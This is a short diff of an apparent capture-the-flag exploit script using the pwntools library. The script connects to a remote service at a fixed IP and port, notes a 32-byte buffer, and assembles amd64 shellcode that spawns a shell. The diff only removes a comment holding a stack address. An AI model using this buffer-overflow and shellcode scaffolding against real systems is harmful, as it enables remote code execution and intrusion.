@@ -4,7 +4,6 @@ context.log_level = 'debug'
 context.arch = 'amd64'
 p = remote('140.110.112.192', 2122)
 #buffer 0x20(32)
-#rsp = 0x7fffffffe0c0
 
 sc = asm(shellcraft.sh())
 print 'size of shellcode:', len(sc)
